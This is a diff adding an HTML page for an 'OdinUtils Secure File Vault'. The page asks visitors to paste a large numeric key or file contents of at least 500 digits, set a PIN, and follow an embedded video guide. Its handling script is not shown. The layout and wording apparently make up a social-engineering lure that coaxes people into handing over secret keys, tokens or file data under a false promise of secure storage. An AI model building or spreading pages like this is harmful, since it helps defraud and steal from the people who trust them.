@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Account — OdinUtils</title>
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+
+  <!-- Style einbinden -->
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="topbar">
+    <div class="logo" aria-hidden="true"></div>
+  </div>
+
+  <main class="container">
+    <header class="hero">
+      <h1>Secure File Vault</h1>
+      <p>Manage large numeric keys or files securely (for your own data).</p>
+    </header>
+
+    <section class="grid">
+      <article class="card">
+        <div class="card-small small-note">OdinUtils</div>
+        <h2 class="form-title">Paste Your File / Key</h2>
+        <p class="form-desc">
+          Create a copy of the file. Review the instructional guide on the right. Submit at least <strong>500 digits</strong>.
+        </p>
+
+        <form id="copyForm" onsubmit="return false;" style="margin-bottom: 24px;">
+          <textarea id="File" class="input" placeholder="Paste large numeric key or file contents here" rows="3"></textarea>
+          <input id="pin" class="input" placeholder="Create a PIN">
+          <button id="copyBtn" class="btn" type="button">Submit</button>
+        </form>
+
+        <span class="brand-small">OdinUtils</span>
+      </article>
+
+      <aside class="card">
+        <div class="card-small small-note">How to use</div>
+        <h3 class="form-title">Guide</h3>
+
+        <!-- Embedded YouTube Video -->
+        <div class="video-wrap">
+          <iframe 
+            width="100%" 
+            height="240"
+            style="border-radius: 9px; border:none;"
+            src="https://www.youtube.com/embed/2WMBwFO65J4" 
+            title="Tutorial Video" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+            allowfullscreen>
+          </iframe>
+        </div>
+
+        <div style="margin-top:12px;text-align:right;">
+          <small class="brand-small" style="position:static;">OdinUtils</small>
+        </div>
+      </aside>
+    </section>
+  </main>
+
+  <div id="toast"></div>
+
+  <!-- Script einbinden -->
+  <script src="script.js"></script>
+</body>
+</html>
